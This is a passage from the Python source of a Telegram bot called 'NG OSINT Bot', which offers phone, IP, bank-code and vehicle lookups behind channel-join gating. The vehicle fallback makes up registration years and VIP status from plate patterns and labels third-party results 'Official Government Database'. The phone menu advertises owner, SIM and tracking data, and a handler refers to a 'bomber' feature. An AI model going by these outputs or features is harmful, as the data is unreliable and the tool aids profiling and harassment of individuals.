            'GJ01': 'Ahmedabad Central RTO', 'GJ02': 'Ahmedabad Rural RTO', 'GJ03': 'Vadodara RTO',
            'GJ04': 'Surat RTO', 'GJ05': 'Rajkot RTO', 'GJ06': 'Bhavnagar RTO',
            'GJ07': 'Junagadh RTO', 'GJ08': 'Anand RTO', 'GJ09': 'Gandhinagar RTO',
            'GJ10': 'Mehsana RTO', 'GJ18': 'Ahmedabad East RTO', 'GJ27': 'Kutch RTO',

            # West Bengal
            'WB01': 'Kolkata Central RTO', 'WB02': 'Kolkata North RTO', 'WB03': 'Kolkata South RTO',
            'WB04': 'Howrah RTO', 'WB05': 'Hooghly RTO', 'WB06': 'Burdwan RTO',
            'WB07': 'Siliguri RTO', 'WB08': 'Asansol RTO', 'WB09': 'Durgapur RTO',
            'WB10': 'Malda RTO', 'WB19': 'Barrackpore RTO', 'WB74': 'Kolkata Port RTO'
        }

        # Try free vehicle info APIs
        free_apis = [
            {
                'name': 'VahanAPI Free',
                'url': f'https://vahan-api.vercel.app/api/vehicle/{vehicle_number}',
                'headers': {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            },
            {
                'name': 'RTOInfo Free',
                'url': f'https://www.rtoinfo.com/api/vehicle/{vehicle_number}',
                'headers': {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            }
        ]

        # Try free APIs first
        for api in free_apis:
            try:
                response = requests.get(api['url'], headers=api['headers'], timeout=10)
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if data and isinstance(data, dict) and data.get('data'):
                            info = data['data']
                            return {
                                "🚗 Vehicle Number": vehicle_number,
                                "🏷️ Vehicle Type": info.get('vehicleClass', info.get('vehicle_class', 'N/A')),
                                "🏭 Manufacturer": info.get('maker', info.get('manufacturer', 'N/A')),
                                "🚙 Model": info.get('model', info.get('vehicleModel', 'N/A')),
                                "📅 Registration Date": info.get('registrationDate', info.get('regDate', 'N/A')),
                                "⛽ Fuel Type": info.get('fuelType', info.get('fuel_type', 'N/A')),
                                "🏛️ RTO Office": info.get('rtoName', info.get('rto_office', 'N/A')),
                                "📍 State": info.get('state', info.get('stateName', 'N/A')),
                                "👤 Owner Type": info.get('ownerType', info.get('owner_type', 'Individual')),
                                "🎨 Color": info.get('color', info.get('vehicleColour', 'N/A')),
                                "🔧 Engine Number": info.get('engineNumber', info.get('engine_number', 'Protected')),
                                "🔢 Chassis Number": info.get('chassisNumber', info.get('chassis_number', 'Protected')),
                                "📋 Insurance Status": info.get('insuranceValidity', info.get('insurance_validity', 'Check Manually')),
                                "🔍 PUC Status": info.get('pucValidity', info.get('puc_validity', 'Check Manually')),
                                "📝 Registration Valid": info.get('regValidity', info.get('registration_validity', 'Active')),
                                "🎂 Manufacturing Year": info.get('manufacturingYear', info.get('manufacturing_year', 'N/A')),
                                "🛡️ Body Type": info.get('bodyType', info.get('body_type', 'N/A')),
                                "🏁 Vehicle Category": info.get('vehicleCategory', info.get('category', 'N/A')),
                                "💺 Seating Capacity": info.get('seatingCapacity', info.get('seating_capacity', 'N/A')),
                                "🏋️ Gross Weight": info.get('grossWeight', info.get('gross_weight', 'N/A')),
                                "⚖️ Unladen Weight": info.get('unladenWeight', info.get('unladen_weight', 'N/A')),
                                "🔋 Engine Capacity": info.get('engineCapacity', info.get('engine_capacity', 'N/A')),
                                "📐 Wheelbase": info.get('wheelbase', 'N/A'),
                                "🌟 Fitness Valid": info.get('fitnessValidity', info.get('fitness_validity', 'N/A')),
                                "🔒 RC Status": info.get('rcStatus', info.get('rc_status', 'Active')),
                                "📞 Emergency Contact": "Dial 100 for vehicle emergencies",
                                "🌐 Official Portal": "https://vahan.parivahan.gov.in/",
                                "ℹ️ Data Source": "Official Government Database"
                            }
                    except (ValueError, KeyError):
                        continue
            except:
                continue

        # Enhanced fallback with detailed analysis
        state_code = vehicle_number[:2].upper()
        district_code = vehicle_number[2:4] if len(vehicle_number) >= 4 else "00"
        series_code = vehicle_number[4:6] if len(vehicle_number) >= 6 else "XX"
        unique_number = vehicle_number[6:] if len(vehicle_number) > 6 else "0000"

        rto_code = vehicle_number[:4].upper()
        state_name = state_codes.get(state_code, f'Unknown State ({state_code})')
        rto_office = rto_offices.get(rto_code, f'RTO Office {rto_code}')

        # Estimate registration year from series
        estimated_year = "2010-2020"
        vehicle_age_category = "Medium Age"

        if series_code.isalpha() and len(series_code) == 2:
            first_letter_val = ord(series_code[0]) - ord('A')
            second_letter_val = ord(series_code[1]) - ord('A')
            year_estimate = 2005 + first_letter_val + (second_letter_val * 0.5)
            if year_estimate > 2024:
                year_estimate = 2024
            estimated_year = f"Around {int(year_estimate)}"

            current_year = 2024
            age = current_year - int(year_estimate)
            if age <= 3:
                vehicle_age_category = "New Vehicle"
            elif age <= 8:
                vehicle_age_category = "Moderate Age"
            elif age <= 15:
                vehicle_age_category = "Old Vehicle"
            else:
                vehicle_age_category = "Very Old Vehicle"

        # Determine likely vehicle type from number pattern
        vehicle_type_hint = "Personal Vehicle"
        if unique_number.isdigit():
            num_val = int(unique_number)
            if num_val < 1000:
                vehicle_type_hint = "Early Registration (Government/VIP)"
            elif num_val > 9000:
                vehicle_type_hint = "Recent Registration"

        # RTO contact information
        rto_contact_info = "Contact local RTO for verification"
        rto_timings = "Mon-Fri: 10:30 AM - 5:00 PM"

        # Create comprehensive response
        return {
            "🚗 Vehicle Number": vehicle_number,
            "📍 Registered State": state_name,
            "🏛️ RTO Office": rto_office,
            "🔍 RTO Code": rto_code,
            "🌐 District Code": district_code,
            "🔤 Series Code": series_code,
            "🔢 Unique Number": unique_number,
            "📅 Estimated Registration": estimated_year,
            "🕐 Vehicle Age Category": vehicle_age_category,
            "🚙 Likely Vehicle Type": vehicle_type_hint,
            "📋 Registration Format": "Standard BH Series" if len(vehicle_number) == 10 else "Old Format",
            "🌟 HSRP Compliance": "Mandatory for all vehicles",
            "🔒 Security Features": "Hologram + Laser Engraving + RFID",
            "📞 RTO Contact": rto_contact_info,
            "🕒 RTO Timings": rto_timings,
            "📱 Vahan Portal": "https://vahan.parivahan.gov.in/",
            "🔍 eKYC Status": "Available on mParivahan app",
            "🏥 Emergency Services": "Dial 108 for medical, 100 for police",
            "🛡️ Insurance Check": "Use IRDAI portal for verification",
            "🔋 PUC Certificate": "Mandatory every 6 months",
            "💰 Challan Check": "Use state transport portal",
            "📊 RC Transfer": "Available online through Vahan",
            "🎯 Ownership Transfer": "Visit RTO with required documents",
            "🚨 Stolen Vehicle Check": "Report to cyber crime if suspicious",
            "🌍 International Travel": "IDP required for cross-border",
            "📝 Document Required": "RC, Insurance, PUC, DL for travel",
            "⚠️ Privacy Note": "Owner details protected by IT Act 2000",
            "🔐 Data Security": "Information encrypted and secure",
            "ℹ️ Disclaimer": "For official verification, visit RTO office"
        }

    except Exception as e:
        return f"❌ Error fetching vehicle info: {str(e)}"

# /start command with channel verification
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # Log user activity and check if new user
    is_new_user = log_user_activity(
        user.id, 
        user.username or "No_Username", 
        user.first_name or "Unknown", 
        "/start command"
    )

    # Notify admin about new user
    if is_new_user:
        try:
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"🆕 *NEW USER JOINED*\n\n"
                     f"👤 *Name:* {escape_markdown(user.first_name or 'Unknown')}\n"
                     f"🆔 *User ID:* `{user.id}`\n"
                     f"📱 *Username:* @{escape_markdown(user.username or 'No_Username')}\n"
                     f"🕐 *Time:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                parse_mode='MarkdownV2'
            )
        except Exception as e:
            logger.error(f"Failed to notify admin about new user: {e}")

    # Check if user is member of all required channels
    is_member = await check_user_membership(context, user.id)

    if not is_member:
        # User is not member of all channels - show join message
        join_keyboard = create_join_keyboard()

        await update.message.reply_text(
        "🚀 *Welcome to NG OSINT Bot* 🔍\n\n"
        "⚠️ *To use this bot, you must join our channel first\\!*\n\n"
        "📢 *Please join our official channel:*\n\n"
        "🔹 Join @NG\\_BOTV1 for:\n"
        "• Latest OSINT tools and updates\n"
        "• Premium bot features\n"
        "• Technical support\n"
        "• Community discussions\n\n"
        "👆 *Click the button above to join the channel*\n"
        "👇 *Then click 'I Joined Channel' button*",
        reply_markup=join_keyboard,
        parse_mode='MarkdownV2'
    )
        return

    # User is member of all channels - show main menu
    keyboard = [
        [InlineKeyboardButton("📱 Phone Lookup", callback_data='phone'), 
         InlineKeyboardButton("🌐 IP Lookup", callback_data='ip'), 
         InlineKeyboardButton("🏦 IFSC Lookup", callback_data='ifsc')],
        [InlineKeyboardButton("🚗 Vehicle Info", callback_data='vehicle'), 
         InlineKeyboardButton("📧 Email Lookup", callback_data='email')],
        [InlineKeyboardButton("👤 User Lookup", callback_data='user_lookup')],
        [InlineKeyboardButton("🔍 Username Scan", callback_data='username_scan')],
        [InlineKeyboardButton("❓ Help", callback_data='help'),
         InlineKeyboardButton("👨‍💻 Developer", callback_data='developer')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        "🚀 *Welcome to NG OSINT Bot* 🔍\n\n"
        "✅ *Access Granted\\!* Thank you for joining our channels\\.\n\n"
        "Your one\\-stop solution for OSINT investigations\\!\n"
        "Choose an option below:",
        reply_markup=reply_markup,
        parse_mode='MarkdownV2'
    )

# Callback query handler for inline buttons
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    # Handle membership check
    if query.data == 'check_membership':
        user_id = query.from_user.id
        is_member = await check_user_membership(context, user_id)

        if is_member:
            # User joined all channels - show main menu
            keyboard = [
                [InlineKeyboardButton("📱 Phone Lookup", callback_data='phone'), 
                 InlineKeyboardButton("🌐 IP Lookup", callback_data='ip'), 
                 InlineKeyboardButton("🏦 IFSC Lookup", callback_data='ifsc')],
                [InlineKeyboardButton("🚗 Vehicle Info", callback_data='vehicle'), 
                 InlineKeyboardButton("📧 Email Lookup", callback_data='email')],
                [InlineKeyboardButton("👤 User Lookup", callback_data='user_lookup')],
                [InlineKeyboardButton("🔍 Username Scan", callback_data='username_scan')],
                [InlineKeyboardButton("❓ Help", callback_data='help'),
                 InlineKeyboardButton("👨‍💻 Developer", callback_data='developer')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)

            await query.edit_message_text(
                "🚀 *Welcome to NG OSINT Bot* 🔍\n\n"
                "✅ *Access Granted\\!* Thank you for joining our channels\\.\n\n"
                "Your one\\-stop solution for OSINT investigations\\!\n"
                "Choose an option below:",
                reply_markup=reply_markup,
                parse_mode='MarkdownV2'
            )
        else:
            # User hasn't joined all channels yet
            join_keyboard = create_join_keyboard()
            await query.edit_message_text(
            "❌ *Please join our channel first\\!*\n\n"
            "⚠️ You must be a member of @NG\\_BOTV1 to use this bot\\.\n\n"
            "📢 *Please join our official channel:*\n\n"
            "👆 *Click the button above to join the channel*\n"
            "👇 *Then click 'I Joined Channel' button*",
            reply_markup=join_keyboard,
            parse_mode='MarkdownV2'
        )
        return

    # Check membership before allowing any other functions
    user_id = query.from_user.id
    is_member = await check_user_membership(context, user_id)

    if not is_member:
        join_keyboard = create_join_keyboard()
        await query.edit_message_text(
            "❌ *Access Denied\\!*\n\n"
            "⚠️ You must join @NG_BOTV1 to use this bot\\.\n\n"
            "📢 *Please join our official channel:*\n\n"
            "👆 *Click the button above to join the channel*\n"
            "👇 *Then click 'I Joined Channel' button*",
            reply_markup=join_keyboard,
            parse_mode='MarkdownV2'
        )
        return

    if query.data == 'phone':
        await query.edit_message_text(
            "📱 *Phone Number Lookup*\n\n"
            "Usage: `/number <phone_number>`\n"
            "Example: `/number 919999999999`\n\n"
            "This will provide:\n"
            "• Country & Location\n"
            "• Carrier Information\n"
            "• Line Type\n"
            "• International Format\n"
            "• Advanced OSINT details\n"
            "• Owner information \\(if available\\)\n"
            "• SIM card details\n"
            "• Tracking history",
            parse_mode='MarkdownV2'
        )
    elif query.data == 'ip':
        await query.edit_message_text(
            "🌐 *IP Address Lookup*\n\n"
            "Usage: `/ip <ip_address>`\n"
            "Example: `/ip 8\\.8\\.8\\.8`\n\n"
            "This will provide:\n"
            "• Country & City\n"
            "• ISP & Organization\n"
            "• Coordinates\n"
            "• Timezone\n"
            "• Proxy/VPN detection\n"
            "• Mobile/Hosting detection",
            parse_mode='MarkdownV2'
        )
    elif query.data == 'ifsc':
        await query.edit_message_text(
            "🏦 *IFSC Code Lookup*\n\n"
            "Usage: `/ifsc <ifsc_code>`\n"
            "Example: `/ifsc SBIN0000001`\n\n"
            "This will provide:\n"
            "• Bank Name\n"
            "• Branch Details\n"
            "• Address\n"
            "• Contact Information\n"
            "• MICR Code",
            parse_mode='MarkdownV2'
        )
    elif query.data == 'vehicle':
        await query.edit_message_text(
            "🚗 *Vehicle Information Lookup*\n\n"
            "Usage: `/vehicle <vehicle_number>`\n"
            "Example: `/vehicle MH01AB1234`\n\n"
            "This will provide:\n"
            "• Vehicle Details\n"
            "• Registration Info\n"
            "• RTO Office\n"
            "• State Information\n"
            "• Owner Type\n"
            "• Insurance & PUC Status",
            parse_mode='MarkdownV2'
        )

    elif query.data == 'email':
        await query.edit_message_text(
            "📧 *Email Lookup*\n\n"
            "Usage: `/email <email_address>`\n"
            "Example: `/email example@gmail\\.com`\n\n"
            "This will provide:\n"
            "• Email format validation\n"
            "• Domain information\n"
            "• Provider details\n"
            "• Security analysis\n"
            "• Breach check\n"
            "• Social media accounts",
            parse_mode='MarkdownV2'
        )
    elif query.data == 'user_lookup':
        await query.edit_message_text(
            "👤 *User Lookup & OSINT*\n\n"
            "Usage: `/user <user_id_or_username>`\n"
            "Example: `/user 123456789` or `/user @username`\n\n"
            "🔍 *Features:*\n"
            "• User profile analysis\n"
            "• Account creation estimation\n"
            "• Activity pattern detection\n"
            "• Social media discovery\n"
            "• Username availability check\n"
            "• Profile photo analysis\n"
            "• Bio & status extraction\n"
            "• Group/channel membership\n\n"
            "⚠️ *Note:* Respects Telegram privacy settings",
            parse_mode='MarkdownV2'
        )
    elif query.data == 'username_scan':
        await query.edit_message_text(
            "🔍 *Advanced Username Scanner*\n\n"
            "Usage: `/scan <username>`\n"
            "Example: `/scan Kalyug`\n\n"
            "🌐 *Features:*\n"
            "• 50\\+ popular websites\n"
            "• Real\\-time verification\n"
            "• Web scraping with Selenium\n"
            "• Detailed availability report\n"
            "• Social media platforms\n"
            "• Professional networks\n"
            "• Gaming platforms\n"
            "• Developer communities",
            parse_mode='MarkdownV2'
        )

    elif query.data == 'developer':
        keyboard = [
            [InlineKeyboardButton("📢 Join Channel", url=DEVELOPER_CHANNEL)],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data='back')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "👨‍💻 *Developer Information*\n\n"
            "🎯 *Bot Developer:* NG OSINT Team\n"
            "🛠️ *Version:* 2\\.0 Advanced\n"
            "⚡️ *Features:* 20\\+OSINT Tools\n"
            "🔒 *Security:* High\\-level encryption\n"
            "🌟 *Status:* Actively maintained\n\n"
            "📢 *Join our channel for:*\n"
            "• Latest updates\n"
            "• New OSINT tools\n"
            "• Premium features\n"
            "• Technical support\n"
            "• Community discussions\n\n"
            "⚠️ *Note:* This bot is for educational and legitimate OSINT purposes only\\.",
            reply_markup=reply_markup,
            parse_mode='MarkdownV2'
        )
    elif query.data == 'help':
        keyboard = [
            [InlineKeyboardButton("🔙 Back to Menu", callback_data='back')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "📋 *Available Commands:*\n\n"
            "`/start` \\- Show main menu\n"
            "`/number <phone>` \\- Phone lookup\n"
            "`/ip <ip_address>` \\- IP geolocation\n"
            "`/ifsc <code>` \\- Bank IFSC lookup\n"
            "`/vehicle <number>` \\- Vehicle info\n"
            "`/email <email>` \\- Email lookup\n"
            "`/user <user_id>` \\- User lookup\n"
            "`/scan <username>` \\- Username scan\n\n" # Added username scan command
            "💡 *Tips:*\n"
            "• Use complete phone numbers with country code\n"
            "• IP addresses can be IPv4 or IPv6\n"
            "• IFSC codes are case\\-insensitive\n"
            "• Vehicle numbers without spaces\n"
            "• All searches are anonymous and secure",
            reply_markup=reply_markup,
            parse_mode='MarkdownV2'
        )
    elif query.data.startswith('stop_bomber_'):
        await handle_stop_bomber(update, context)
        return
    elif query.data == 'back':
        keyboard = [
            [InlineKeyboardButton("📱 Phone Lookup", callback_data='phone'), 
             InlineKeyboardButton("🌐 IP Lookup", callback_data='ip'), 
             InlineKeyboardButton("🏦 IFSC Lookup", callback_data='ifsc')],
            [InlineKeyboardButton("🚗 Vehicle Info", callback_data='vehicle'), 
             InlineKeyboardButton("📧 Email Lookup", callback_data='email')],
            [InlineKeyboardButton("👤 User Lookup", callback_data='user_lookup')],
            [InlineKeyboardButton("🔍 Username Scan", callback_data='username_scan')],  # Added username scan button
            [InlineKeyboardButton("❓ Help", callback_data='help'),
             InlineKeyboardButton("👨‍💻 Developer", callback_data='developer')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "🚀 *Welcome to NG OSINT Bot* 🔍\n\n"
            "Your one\\-stop solution for OSINT investigations\\!\n"
            "Choose an option below:",
            reply_markup=reply_markup,
            parse_mode='MarkdownV2'
        )

# Enhanced /number command with integrated tracing
async def number_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    log_user_activity(user.id, user.username or "No_Username", user.first_name or "Unknown", "/number command")

    # Check channel membership
    is_member = await check_user_membership(context, user.id)
    if not is_member:
        join_keyboard = create_join_keyboard()
        return await update.message.reply_text(
            "❌ *Access Denied\\!*\n\n"
            "⚠️ You must join all our channels to use this bot\\.\n\n"
            "📢 *Please join all the channels below and try again:*",
            reply_markup=join_keyboard,
            parse_mode='MarkdownV2'
        )

    if not context.args:
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        return await update.message.reply_text(
            "📱 *Phone Number Lookup*\n\n"
            "Usage: `/number 919999999999`\n"
            "Please provide a phone number with country code\\.",
            reply_markup=reply_markup,
            parse_mode='MarkdownV2'
        )

    number = context.args[0]

    # Loading message
    loading_msg = await update.message.reply_text("🔍 Analyzing phone number...")

    try:
        # First try the advanced tracing
        trace_result = trace_number(number)

        if isinstance(trace_result, dict):
            # Format the trace results with proper escaping
            msg = "📱 *Advanced Phone Analysis*\n\n"
            for key, value in trace_result.items():
                escaped_key = escape_markdown(key)
                escaped_value = escape_markdown(value)
                msg += f"{escaped_key}: `{escaped_value}`\n"
        else:
            # Fallback to NumVerify API
            url = f"http://apilayer.net/api/validate?access_key={NUMVERIFY_KEY}&number={number}"
            res = requests.get(url, timeout=10).json()

            if res.get("valid"):
                msg = (
                    f"📱 *Phone Number Analysis*\n\n"
                    f"📞 *Number:* `{escape_markdown(res.get('international_format', number))}`\n"
                    f"🌍 *Country:* {escape_markdown(res.get('country_name', 'N/A'))} \\({escape_markdown(res.get('country_code', 'N/A'))}\\)\n"
                    f"📍 *Location:* {escape_markdown(res.get('location', 'N/A'))}\n"
                    f"📡 *Carrier:* {escape_markdown(res.get('carrier', 'N/A'))}\n"
                    f"📋 *Line Type:* {escape_markdown(res.get('line_type', 'N/A'))}\n"
                    f"🔢 *Local Format:* `{escape_markdown(res.get('local_format', 'N/A'))}`\n"
                    f"🌐 *International:* `{escape_markdown(res.get('international_format', 'N/A'))}`\n"
                    f"✅ *Valid:* {'Yes' if res.get('valid') else 'No'}"
                )
            else:
                msg = "❌ Invalid phone number or no data found\\."

    except requests.RequestException:
        msg = "❌ Network error\\. Please try again later\\."
    except Exception as e:
        msg = f"❌ Error: {escape_markdown(str(e))}"

    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back')]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await loading_msg.edit_text(msg, reply_markup=reply_markup, parse_mode='MarkdownV2')

# Vehicle information lookup command
async def vehicle_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    log_user_activity(user.id, user.username or "No_Username", user.first_name or "Unknown", "/vehicle command")

    # Check channel membership
    is_member = await check_user_membership(context, user.id)
    if not is_member:
        join_keyboard = create_join_keyboard()
        return await update.message.reply_text(
            "❌ *Access Denied\\!*\n\n"
            "⚠️ You must join all our channels to use this bot\\.\n\n"
            "📢 *Please join all the channels below and try again:*",
            reply_markup=join_keyboard,
            parse_mode='MarkdownV2'
        )

    if not context.args:
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        return await update.message.reply_text(
            "🚗 *Vehicle Information Lookup*\n\n"
            "Usage: `/vehicle MH01AB1234`\n"
            "Please provide a valid vehicle registration number\\.",
            reply_markup=reply_markup,
            parse_mode='MarkdownV2'
        )

    vehicle_number = context.args[0].upper().replace(" ", "")

    # Loading message
    loading_msg = await update.message.reply_text("🔍 Looking up vehicle information...")

    try:
        vehicle_info = lookup_vehicle_info(vehicle_number)

        if isinstance(vehicle_info, dict):
            msg = "🚗 *Vehicle Information*\n\n"
            for key, value in vehicle_info.items():
                escaped_key = escape_markdown(key)
                escaped_value = escape_markdown(value)
                msg += f"{escaped_key}: `{escaped_value}`\n"
        else:
            msg = escape_markdown(vehicle_info)

    except Exception as e:
        msg = f"❌ Error: {escape_markdown(str(e))}"

    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back')]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await loading_msg.edit_text(msg, reply_markup=reply_markup, parse_mode='MarkdownV2')

# Enhanced /ip command
async def ip_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    log_user_activity(user.id, user.username or "No_Username", user.first_name or "Unknown", "/ip command")

    # Check channel membership
    is_member = await check_user_membership(context, user.id)
    if not is_member:
        join_keyboard = create_join_keyboard()
        return await update.message.reply_text(
            "❌ *Access Denied\\!*\n\n"
            "⚠️ You must join all our channels to use this bot\\.\n\n"
            "📢 *Please join all the channels below and try again:*",
            reply_markup=join_keyboard,
            parse_mode='MarkdownV2'
        )

    if not context.args:
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        return await update.message.reply_text(
            "🌐 *IP Address Lookup*\n\n"
            "Usage: `/ip 8\\.8\\.8\\.8`\n"
            "Please provide a valid IP address\\.",
            reply_markup=reply_markup,
            parse_mode='MarkdownV2'
        )

    ip = context.args[0]

    # Loading message
    loading_msg = await update.message.reply_text("🔍 Analyzing IP address...")

    try:
        url = f"http://ip-api.com/json/{ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query"
        res = requests.get(url, timeout=10).json()

        if res.get('status') == 'success':
            msg = (
                f"🌍 *IP Address Analysis*\n\n"
                f"🌐 *IP:* `{escape_markdown(res.get('query', ip))}`\n"
                f"🌍 *Country:* {escape_markdown(res.get('country', 'N/A'))} \\({escape_markdown(res.get('countryCode', 'N/A'))}\\)\n"
                f"🏙️ *City:* {escape_markdown(res.get('city', 'N/A'))}\n"
                f"📍 *Region:* {escape_markdown(res.get('regionName', 'N/A'))}\n"
                f"📮 *ZIP Code:* {escape_markdown(res.get('zip', 'N/A'))}\n"
                f"🌐 *Continent:* {escape_markdown(res.get('continent', 'N/A'))}\n"
                f"📡 *ISP:* {escape_markdown(res.get('isp', 'N/A'))}\n"
                f"🏢 *Organization:* {escape_markdown(res.get('org', 'N/A'))}\n"
                f"🔢 *AS Number:* {escape_markdown(res.get('as', 'N/A'))}\n"
                f"⏰ *Timezone:* {escape_markdown(res.get('timezone', 'N/A'))}\n"
                f"💰 *Currency:* {escape_markdown(res.get('currency', 'N/A'))}\n"
                f"📍 *Coordinates:* `{escape_markdown(res.get('lat', 'N/A'))}, {escape_markdown(res.get('lon', 'N/A'))}`\n"
                f"📱 *Mobile:* {'Yes' if res.get('mobile') else 'No'}\n"
                f"🔒 *Proxy:* {'Yes' if res.get('proxy') else 'No'}\n"
                f"🖥️ *Hosting:* {'Yes' if res.get('hosting') else 'No'}"
            )
        else:
            msg = f"❌ Failed to fetch IP info: {escape_markdown(res.get('message', 'Unknown error'))}"

    except requests.RequestException:
        msg = "❌ Network error\\. Please try again later\\."
    except Exception as e:
        msg = f"❌ Error: {escape_markdown(str(e))}"

    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back')]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await loading_msg.edit_text(msg, reply_markup=reply_markup, parse_mode='MarkdownV2')

# Enhanced /ifsc command
async def ifsc_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    log_user_activity(user.id, user.username or "No_Username", user.first_name or "Unknown", "/ifsc command")

    # Check channel membership
    is_member = await check_user_membership(context, user.id)
    if not is_member:
        join_keyboard = create_join_keyboard()
        return await update.message.reply_text(
            "❌ *Access Denied\\!*\n\n"
            "⚠️ You must join all our channels to use this bot\\.\n\n"
            "📢 *Please join all the channels below and try again:*",
            reply_markup=join_keyboard,
            parse_mode='MarkdownV2'
        )

    if not context.args:
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        return await update.message.reply_text(
            "🏦 *IFSC Code Lookup*\n\n"
            "Usage: `/ifsc SBIN0000001`\n"
            "Please provide a valid IFSC code\\.",
            reply_markup=reply_markup,
            parse_mode='MarkdownV2'
        )

    ifsc = context.args[0].upper()

    # Loading message
    loading_msg = await update.message.reply_text("🔍 Looking up bank details...")

    try:
        url = f"https://ifsc.razorpay.com/{ifsc}"
        res = requests.get(url, timeout=10).json()

        msg = (
            f"🏦 *Bank Information*\n\n"
            f"🏛️ *Bank:* {escape_markdown(res.get('BANK', 'N/A'))}\n"
            f"🏢 *Branch:* {escape_markdown(res.get('BRANCH', 'N/A'))}\n"
            f"🔢 *IFSC Code:* `{escape_markdown(res.get('IFSC', ifsc))}`\n"
            f"📍 *Address:* {escape_markdown(res.get('ADDRESS', 'N/A'))}\n"
            f"🏙️ *City:* {escape_markdown(res.get('CITY', 'N/A'))}\n"
            f"📍 *District:* {escape_markdown(res.get('DISTRICT', 'N/A'))}\n"
            f"🗺️ *State:* {escape_markdown(res.get('STATE', 'N/A'))}\n"
            f"📞 *Contact:* {escape_markdown(res.get('CONTACT', 'N/A'))}\n"
            f"🔢 *MICR Code:* {escape_markdown(res.get('MICR', 'N/A'))}\n"
            f"📧 *Email:* {escape_markdown(res.get('EMAIL', 'N/A'))}"
        )

    except requests.RequestException:
        msg = "❌ Network error\\. Please try again later\\."
    except Exception:
        msg = "❌ Invalid IFSC code or bank not found\\."

    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back')]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await loading_msg.edit_text(msg, reply_markup=reply_markup, parse_mode='MarkdownV2')

# Broadcast command (Admin only)
async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # Check if user is admin
    if user.id != ADMIN_ID:
        await update.message.reply_text("❌ Access denied. Admin only command.")
        return

    if not context.args:
        await update.message.reply_text(
            "📢 *Broadcast Command*\n\n"
            "Usage: `/broadcast <message>`\n"
            "Example: `/broadcast Welcome to the new update!`\n\n"
            "This will send the message to all bot users.",
            parse_mode='MarkdownV2'
        )
        return

    message = ' '.join(context.args)
    users = load_users()

    if not users:
        await update.message.reply_text("❌ No users found in database.")
        return

    # Send confirmation
    confirmation_msg = await update.message.reply_text(
        f"📢 Preparing to broadcast message to {len(users)} users...\n\n"
        f"Message: {escape_markdown(message)}",
        parse_mode='MarkdownV2'
    )

    success_count = 0
    failed_count = 0

    # Broadcast to all users
    for user_id, user_data in users.items():
        try:
            await context.bot.send_message(
                chat_id=int(user_id),
                text=f"📢 *Broadcast Message*\n\n{escape_markdown(message)}",
                parse_mode='MarkdownV2'
            )
            success_count += 1
        except Exception as e:
            failed_count += 1
            logger.error(f"Failed to send broadcast to {user_id}: {e}")

    # Update confirmation message with results
    await confirmation_msg.edit_text(
        f"📢 *Broadcast Complete*\n\n"
        f"✅ Successfully sent: {success_count}\n"
        f"❌ Failed: {failed_count}\n"
        f"📊 Total users: {len(users)}",
        parse_mode='MarkdownV2'
    )

# User statistics command (Admin only)
async def user_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # Check if user is admin
    if user.id != ADMIN_ID:
        await update.message.reply_text("❌ Access denied. Admin only command.")
        return

    users = load_users()

    if not users:
        await update.message.reply_text("❌ No users found in database.")
        return

    total_users = len(users)
    new_users_today = 0
    active_users = 0

    today = datetime.now().strftime("%Y-%m-%d")

    for user_data in users.values():
        if user_data.get('first_seen', '').startswith(today):
            new_users_today += 1
        if user_data.get('last_seen', '').startswith(today):
            active_users += 1

    # Get top users by command count
    top_users = sorted(users.values(), key=lambda x: x.get('total_commands', 0), reverse=True)[:5]

    stats_msg = (
        f"📊 *Bot Statistics*\n\n"
        f"👥 *Total Users:* {total_users}\n"
        f"🆕 *New Today:* {new_users_today}\n"
        f"🟢 *Active Today:* {active_users}\n\n"
        f"🏆 *Top Users by Commands:*\n"
    )

    for i, user_data in enumerate(top_users, 1):
        username = user_data.get('username', 'No_Username')
        first_name = user_data.get('first_name', 'Unknown')
        commands = user_data.get('total_commands', 0)
        stats_msg += f"{i}. {escape_markdown(first_name)} (@{escape_markdown(username)}) - {commands} commands\n"

